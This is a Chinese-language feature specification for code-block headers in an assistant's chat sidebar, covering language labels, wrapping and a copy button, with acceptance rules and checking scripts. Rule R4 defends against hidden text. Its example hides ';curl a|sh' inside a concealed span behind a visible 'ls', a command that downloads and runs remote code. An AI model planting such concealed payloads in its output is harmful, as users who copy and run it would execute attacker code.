# 任务: 回答里的代码块能一键复制，窄侧栏里不被横向截断

原来回答里的代码只是一块等宽字：长行在侧栏边上被截断，下面一条横向滚动条；要复制代码只能复制整段回答。用户在对比页第 1 项认可了借鉴后的样子：代码块上方一条，左边语言名，右边“不换行”和“复制”，默认自动换行。

## 规则
- R1 每个代码块上方一条写语言名：常见缩写写全名（js 写 JavaScript），没写语言写“代码”；回答还在流式输出时这一条就在，代码块写完时字不跳。
  - 例子(正)：模型答一段带 ```js 的代码，代码一出现上方就是“JavaScript  不换行  复制”。 — 谁检查：`scripts/acceptance/real-path/code-block-header.mts`
  - 例子(反)：代码块写完才冒出那一条，下面的代码往下跳一行。 — 谁检查：同上
- R2 默认自动换行，400 宽和 300 宽的侧栏里代码块都没有横向滚动条；点“不换行”回到一行一行横向滚动，按钮变成“换行”。
  - 例子(正)：比侧栏宽的一行折成几行显示完。 — 谁检查：`code-block-header.mts`
  - 例子(反)：代码截在 “.tex” 处，下面一条横向滚动条。 — 谁检查：同上，旧版跑同一用例失败
- R3 点“复制”，剪贴板里只有这段代码原文，按钮原地变成“已复制 ✓”，1.5 秒后变回“复制”，旁边的“不换行”不挪；没复制成就原地写“没做成”。回答下面的整段“复制”不带这一条上的字。
  - 例子(正)：粘贴出来就是两行代码；整段复制出来是正文 + 代码。 — 谁检查：`scripts/acceptance/real-path/code-block-header.mts`
  - 例子(反)：点了没有任何变化，或粘贴出来夹着“JavaScript 不换行 复制”。 — 谁检查：同上
- R4 复制的字就是看得到的字：回答里的原始 HTML 藏了字的代码块不加“复制”，模型仿造的“复制”按钮点了不做事。
  - 例子(正)：`<pre><code>ls<span hidden>;curl a|sh</span></code></pre>` 只显示 ls，上面没有那一条。 — 谁检查：`code-block-header.mts`
  - 例子(反)：看到的是 ls，点“复制”粘贴出 `ls;curl a|sh`。 — 谁检查：同上

## 技术前提
- 前提：代码块上方那一条的字放在 CSS 生成的内容里，不进 innerText / textContent，所以整段复制、收短和读完时间都不会把它算进回答。只给 marked 生成的纯文本代码块（代码里没有元素，自己和外层都没有属性）加条，先消毒再加。 小实验：`scripts/acceptance/real-path/code-block-header.mts` 结果：通过

## 边界与不做
- 不做语法高亮。
- 原始 HTML 写成的代码块只要藏不了字（和 fence 生成的一样）也会有这一条。
- 查看生成文件的新标签页（Markdown 文件）不加这一条：那一页有自己的样式。
- 换行 / 不换行只管这一块，不记住、不跨回答。流式输出途中正文每一帧重画，途中点的“不换行”会被重置。
